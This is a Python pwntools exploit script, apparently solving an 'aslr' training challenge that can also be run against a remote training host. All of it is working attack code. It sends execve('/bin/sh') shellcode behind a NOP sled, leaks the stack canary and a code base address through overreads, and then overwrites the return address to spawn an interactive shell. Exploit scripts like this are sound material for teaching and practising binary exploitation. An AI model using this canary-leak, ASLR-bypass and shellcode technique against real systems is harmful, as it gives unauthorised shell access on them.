from pwn import *
import sys
import time

context.arch = 'amd64'

if(len(sys.argv) > 1):
	if(sys.argv[1] == '--debug'):
		p = process("./aslr")
		gdb.attach(p, """
		b *main+336
		call (long)mprotect(0x000000404000, 0x1000, 0x7)
		"""	)
		input("wait...")
	elif(sys.argv[1] == '--strace'):
		p = process(["strace", "./aslr"])
	elif(sys.argv[1] == '--remote'):
		p = remote("bin.training.offdef.it", 2012)
else:
	p = process("./aslr")

cyclic = cyclic_gen()

asm_code = """
lea rax, [rip]
add rax, 0x16
mov rdi, rax
mov rax, 0x3b
xor rsi, rsi
xor rdx, rdx
syscall
.string "/bin/sh"
"""

sh = asm(asm_code)

p.send(b'\x90' * (100-len(sh)) + sh)

input("send second input")
p.send(cyclic.get(105))
p.recvuntil(b'aaazaabb')

canary = b"\x00" + p.recv(7)
print('canary: %#x' % u64(canary))
print('len(canary) = ', len(canary))

input("send third input")
p.send(b'A' * 184 + b'BB')
p.recvuntil(b'BB')

base = p.recv(4)
print('base addr: %#x' % u64(b'\x00'*4 + base))
addr = b'\x00' * 2 + base + b'\x00' * 2
code_pos = u64(addr) + 0x201080
print('addr: %#x' % code_pos)
print('len(addr) = ', len(addr))

input("send fourth input")
p.send(b'A'*104 + canary + b'A'*8 + p64(code_pos))
sleep(0.1)
p.sendline()

p.interactive()